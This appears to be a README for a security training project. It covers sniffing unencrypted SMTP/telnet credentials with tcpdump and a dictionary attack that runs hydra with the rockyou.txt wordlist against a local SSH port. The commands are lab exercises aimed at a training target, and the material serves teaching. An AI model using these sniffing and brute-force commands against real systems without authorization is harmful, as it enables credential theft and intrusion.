 # Attack is the best defense

## Resource

- [Network sniffing](https://www.lifewire.com/definition-of-sniffer-817996)
- [ARP spoofing](https://www.veracode.com/security/arp-spoofing)
- [Connect to SendGrid’s SMTP relay using telnet](https://docs.sendgrid.com/ui/account-and-settings/troubleshooting-delays-and-latency)
- [What is Docker and why is it popular?](https://www.zdnet.com/article/what-is-docker-and-why-is-it-so-darn-popular/)
- [Dictionary attack](https://en.wikipedia.org/wiki/Dictionary_attack)


## Tasks

<details>
<summary><a href="./0-sniffing">0. ARP spoofing and sniffing unencrypted traffic</a></summary><br>

<a href='https://postimg.cc/dZFTgZM5' target='_blank'><img src='https://i.postimg.cc/nrjYjq3f/image.png' border='0' alt='image'/></a>

Security is a vast topic, and network security is an important part of it. A lot of very sensitive information goes over networks that are used by many people, and some people might have bad intentions. Traffic going through a network can be intercepted by a malicious machine pretending to be another network device. Once the traffic is redirected to the malicious machine, the hacker can keep a copy of it and analyze it for potential interesting information. It is important to note that the traffic must then be forwarded to the actual device it was supposed to go (so that users and the system keep going as if nothing happened).

Any information that is not encrypted and sniffed by an attacker can be seen by the attacker - that could be your email password or credit card information. While today’s network security is much stronger than it used to be, there are still some legacy systems that are using unencrypted communication means. A popular one is telnet.

In this project, we will not go over ARP spoofing, but we’ll start by sniffing unencrypted traffic and getting information out of it.

Sendgrid offers is an emailing service that provides state of the art secure system to send emails, but also supports a legacy unsecured way: telnet. You can create an account for free, which is what I did, and send an email using telnet:

```sh
sylvain@ubuntu$ telnet smtp.sendgrid.net 587
Trying 167.89.121.145...
Connected to smtp.sendgrid.net.
Escape character is '^]'.
220 SG ESMTP service ready at ismtpd0013p1las1.sendgrid.net
EHLO ismtpd0013p1las1.sendgrid.net
250-smtp.sendgrid.net
250-8BITMIME
250-PIPELINING
250-SIZE 31457280
250-STARTTLS
250-AUTH PLAIN LOGIN
250 AUTH=PLAIN LOGIN
auth login           
334 VXNlcm5hbWU6
VGhpcyBpcyBteSBsb2dpbg==
334 UGFzc3dvcmQ6
WW91IHJlYWxseSB0aG91Z2h0IEkgd291bGQgbGV0IG15IHBhc3N3b3JkIGhlcmU/ISA6RA==
235 Authentication successful
mail from: sylvain@kalache.fr
250 Sender address accepted
rcpt to: julien@google.com
250 Recipient address accepted
data
354 Continue
To: Julien
From: Sylvain
Subject: Hello from the insecure world

I am sending you this email from a Terminal.
.
250 Ok: queued as Aq1zhMM3QYeEprixUiFYNg
quit
221 See you later
Connection closed by foreign host.
sylvain@ubuntu$ 
```

<a href='https://postimages.org/' target='_blank'><img src='https://i.postimg.cc/kG0NxDH6/image.png' border='0' alt='image'/></a>

```sh
# Run this when there is no other process running,
# ...tried to find a way to specifically filter the specif process but
# ...the best option was to run it in a virtual enviroment
# ...also base64 should be your best friend
sudo tcpdump -A -l
```

- [user\_authenticating\_into\_server](./user_authenticating_into_server) binary script file.

</details>

<details>
<summary><a href="./1-dictionary_attack">1. Dictionary attack</a></summary><br>

<a href="https://ibb.co/Ltr6sZh"><img src="https://i.ibb.co/7WQV01N/image.png" alt="image" border="0"></a>

- [Wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) **Rockyou.txt**

```sh
# command
hydra -V -s 2222 -l sylvain -P rockyou.txt 127.0.0.1 ssh -t 64
```

</details> 
